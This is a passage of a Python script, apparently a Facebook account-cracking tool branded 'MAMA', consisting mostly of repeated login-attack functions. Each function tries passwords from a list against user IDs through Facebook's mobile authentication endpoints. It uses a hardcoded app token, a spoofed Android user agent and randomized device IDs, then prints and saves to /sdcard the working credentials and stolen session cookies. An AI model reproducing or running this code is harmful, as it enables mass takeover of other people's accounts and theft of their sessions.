                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-api.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}MAMA-OK{B}❳{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/MAMA-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}MAMA-CP{B}❳{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MAMA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}MAMA-M1{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}MAMA-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/MAMA-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}MAMA-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MAMA-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}MAMA-M2{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}MAMA-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/MAMA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}MAMA-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MAMA-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M3 |__________________#
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}MAMA-M3{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}MAMA-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/MAMA-RANDOM-M3-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}MAMA-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MAMA-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| END |__________________#
try:
 
    menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
    print(e)